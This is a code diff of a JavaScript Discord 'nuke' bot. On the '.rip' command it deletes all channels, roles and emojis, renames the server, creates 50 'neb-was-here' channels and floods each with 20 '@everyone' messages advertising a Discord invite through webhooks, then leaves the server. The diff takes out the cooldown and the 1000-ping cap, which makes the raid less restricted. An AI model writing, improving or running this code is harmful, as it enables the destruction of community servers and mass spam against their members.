@@ -11,6 +11,7 @@ const client = new Client({
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildMembers,
     GatewayIntentBits.GuildWebhooks,
     GatewayIntentBits.GuildEmojisAndStickers
   ]
@@ -28,10 +29,6 @@ app.listen(PORT, () => {
   console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
 
-// ====== COOLDOWN LOGIC ======
-const cooldowns = new Map(); // userId -> timestamp
-const cooldownDuration = 10 * 60 * 1000; // 10 minutes in ms
-
 // ====== BOT LOGIC ======
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
@@ -39,27 +36,25 @@ client.on('ready', () => {
 
 client.on('messageCreate', async (message) => {
   if (message.content === '.rip' && !message.author.bot) {
-    const authorId = message.author.id;
     const guild = message.guild;
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
-    let pingCount = 0;
-    const maxPings = 1000;
 
-    // Cooldown check
-    if (cooldowns.has(authorId)) {
-      const expirationTime = cooldowns.get(authorId) + cooldownDuration;
-      if (Date.now() < expirationTime) return;
-    }
-    cooldowns.set(authorId, Date.now());
+    // Delete all channels concurrently
+    await Promise.all(guild.channels.cache.map(channel =>
+      channel.delete().catch(() => {})
+    ));
 
-    // Parallel deletion of all existing content
-    await Promise.all([
-      guild.channels.cache.map(c => c.delete().catch(() => {})),
-      guild.roles.cache
-        .filter(r => r.name !== '@everyone' && !r.managed)
-        .map(r => r.delete().catch(() => {})),
-      guild.emojis.cache.map(e => e.delete().catch(() => {}))
-    ]);
+    // Delete all roles except @everyone
+    await Promise.all(guild.roles.cache.map(async (role) => {
+      if (role.name !== '@everyone' && !role.managed) {
+        return role.delete().catch(() => {});
+      }
+    }));
+
+    // Delete all emojis
+    await Promise.all(guild.emojis.cache.map(emoji =>
+      emoji.delete().catch(() => {})
+    ));
 
     // Rename server
     try {
@@ -68,67 +63,44 @@ client.on('messageCreate', async (message) => {
 
     // Create 50 new channels
     const createdChannels = [];
-    const createPromises = [];
-
     for (let i = 0; i < 50; i++) {
-      createPromises.push(
-        guild.channels.create({ name: 'neb-was-here' }).then(ch => {
-          if (ch) createdChannels.push(ch);
-        })
-      );
+      try {
+        const channel = await guild.channels.create({ name: 'neb-was-here' });
+        createdChannels.push(channel);
+      } catch {}
     }
 
-    await Promise.all(createPromises);
-
-    // Spam logic
+    // Spam each channel with 20 messages using webhooks or fallback to send
     const spamTasks = [];
 
     for (const channel of createdChannels) {
-      if (pingCount >= maxPings) break;
+      try {
+        const webhook = await channel.createWebhook({
+          name: 'Nebula',
+          avatar: 'https://i.imgur.com/6QbX6yA.png '
+        });
 
-      spamTasks.push(
-        (async () => {
-          let webhook;
-          try {
-            webhook = await channel.createWebhook({
-              name: 'Nebula',
-              avatar: 'https://i.imgur.com/6QbX6yA.png '
-            });
-          } catch {
-            // Fallback to sending directly
-            for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
-              if (pingCount >= maxPings) break;
-              spamTasks.push(channel.send(spamMessage).catch(() => {}));
-              pingCount++;
-            }
-            return;
-          }
-
-          for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
-            if (pingCount >= maxPings) break;
-            spamTasks.push(
-              webhook.send(spamMessage).catch(async () => {
-                try {
-                  await channel.send(spamMessage);
-                  pingCount++;
-                } catch {}
-              })
-            );
-            pingCount++;
-          }
-        })()
-      );
+        for (let i = 0; i < 20; i++) {
+          spamTasks.push(
+            webhook.send(spamMessage).catch(async () => {
+              await channel.send(spamMessage).catch(() => {});
+            })
+          );
+        }
+      } catch {
+        for (let i = 0; i < 20; i++) {
+          spamTasks.push(channel.send(spamMessage).catch(() => {}));
+        }
+      }
     }
 
     // Run all spam tasks concurrently
     await Promise.all(spamTasks);
 
-    // Leave server
+    // Leave the server
     try {
       await guild.leave();
     } catch {}
-
-    // DO NOT destroy client
   }
 });
 
